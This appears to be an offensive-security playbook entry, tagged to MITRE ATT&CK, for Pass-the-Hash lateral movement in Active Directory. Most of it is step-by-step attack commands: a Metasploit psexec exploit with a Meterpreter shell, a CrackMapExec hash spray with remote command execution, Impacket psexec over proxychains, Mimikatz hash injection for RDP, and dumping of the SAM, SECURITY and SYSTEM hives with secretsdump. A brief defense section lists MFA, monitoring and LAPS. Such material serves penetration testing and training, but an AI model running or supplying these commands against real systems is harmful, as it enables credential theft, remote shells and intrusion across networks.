---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Pass the Hash|T1550.002 - Pass the Hash]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Pass-the-Hash]]'
commands:
  - '[[commands/crackmapexec-smb-execute-whoami]]'
  - '[[commands/impacket-psexec-pass-the-hash]]'
  - '[[commands/windows-reg-save-sam-hives]]'
  - '[[commands/impacket-secretsdump-local]]'
platforms:
  - Windows
tools:
  - '[[tools/metasploit-framework]]'
  - '[[tools/CrackMapExec]]'
  - '[[tools/Impacket]]'
  - '[[tools/Mimikatz]]'
validated: true
---

# Pass-the-Hash-Active-Directory-Attack

## Summary

This procedure demonstrates Pass-the-Hash (PtH), a technique to authenticate to remote Windows systems in an Active Directory environment using an NTLM hash instead of a plaintext password. It covers multiple methods for lateral movement and hash extraction, enabling attackers to pivot across the network without cracking passwords.

## Description

Pass-the-Hash exploits the NTLM authentication protocol in Windows, allowing the use of stolen NTLM hashes for authentication to services like SMB, RDP, and WMI. In an Active Directory setup, this facilitates lateral movement from a compromised host to domain-joined systems. The procedure assumes the attacker has already obtained a valid NTLM hash (e.g., via credential dumping with tools like Mimikatz). It includes remote code execution via SMB, verification of access, RDP connections, and local hash extraction for further pivoting. Target environment: Domain-joined Windows servers/clients with SMB/RDP enabled. Expected outcomes: Shell access, persistent sessions, and additional credentials for network traversal.

## Requirements

1. Valid NTLM hash of a domain or local user (LM hash can be blank: aad3b435b51404eeaad3b435b51404ee)
2. Network access to target systems (e.g., SMB ports 445 open)
3. Installed tools: Metasploit, CrackMapExec, Impacket suite, Mimikatz
4. Attacker machine on the same network segment or via proxy (e.g., proxychains for pivoting)
5. Administrative privileges on initial compromised host for hash dumping

## Defense

- Enable multi-factor authentication (MFA) for all accounts to block hash-based logons
- Monitor for anomalous NTLM authentications and SMB/RDP traffic using tools like Sysmon or Windows Event Logs (Event ID 4624 with Logon Type 3/9)
- Implement Local Administrator Password Solution (LAPS) and restrict NTLM usage via Group Policy
- Use Protected Users group to limit hash delegation and enable credential guard

## Objectives

1. Authenticate to remote systems using stolen NTLM hashes
2. Achieve remote code execution and shell access for lateral movement
3. Establish persistent remote desktop sessions
4. Extract additional local hashes for further attacks
5. Escalate access across the Active Directory domain

## Instructions

### Step 1: Remote Code Execution via SMB with Metasploit

**Context**: Use the Metasploit psexec module to execute a payload on the target using PtH. This step authenticates via SMB and spawns a Meterpreter shell, ideal for initial lateral movement.

**Code** ([[codes/metasploit-psexec-with-hash]]):

```msfconsole
use exploit/windows/smb/psexec
set RHOST $_TARGET_IP
set SMBUser $_USERNAME
set SMBPass $_NTLM_HASH  
# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
# NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

> Selects the psexec exploit, sets target details with hash for PtH, deploys payload, and opens a shell. Replace placeholders with actual values. Success is indicated by a Meterpreter session.

### Step 2: Verify Access and Retrieve Current User with CrackMapExec

**Context**: Use CrackMapExec to test SMB authentication with the hash across an IP range and execute a simple command like whoami to confirm privileges and current context.

**Command** ([[commands/crackmapexec-smb-execute-whoami]]):

```bash
cme smb $_TARGET_RANGE -u $_USERNAME -H '$_LM_HASH:$_NTLM_HASH' -x "whoami"
```

> Scans the IP range, authenticates with the provided hash, and runs whoami on successful targets. Expected output shows the current user context (e.g., DOMAIN\username) for each host.

### Step 3: Execute Commands via Impacket Psexec with Proxychains

**Context**: Leverage Impacket's psexec.py for command execution over SMB using PtH, routed through proxychains for anonymity or pivoting through a compromised host.

**Command** ([[commands/impacket-psexec-pass-the-hash]]):

```bash
proxychains python ./psexec.py $_USERNAME@$_TARGET_IP -hashes :$_NTLM_HASH
```

> Routes the connection via proxy, authenticates with the NTLM hash, and provides an interactive shell on the target. Use this when direct access is blocked; success yields a command prompt on the remote system.

### Step 4: Establish RDP Connection with Mimikatz

**Context**: Use Mimikatz's sekurlsa::pth to inject the hash and launch an RDP session in restricted admin mode, allowing graphical access without password entry.

**Code** ([[codes/mimikatz-pass-the-hash-rdp-connection]]):

```mimikatz
sekurlsa::pth /user:$_USERNAME /domain:$_DOMAIN /ntlm:$_NTLM_HASH
sekurlsa::pth /user:$_USERNAME /domain:$_DOMAIN /ntlm:$_NTLM_HASH /run:"mstsc.exe /restrictedadmin"
```

> Performs PtH to create a token with the hash, then launches RDP to the target ($_TARGET_IP implied in mstsc config). Restricted mode limits admin actions for stealth. Success: RDP window opens with authenticated session.

### Step 5: Extract Local Administrator Hashes

**Context**: On a compromised host, save registry hives containing local credentials and use secretsdump to extract hashes from the SAM database for local admin accounts, enabling further PtH attacks.

**Command** ([[commands/windows-reg-save-sam-hives]]):

```cmd
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

> Exports the SAM, SECURITY, and SYSTEM hives to files. Run as admin; success creates .save files in C:\temp.

**Command** ([[commands/impacket-secretsdump-local]]):

```bash
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

> Dumps local accounts and NTLM hashes from the hives. Expected output: Username:rid:lmhash:nthash format for local admins, ready for PtH use.
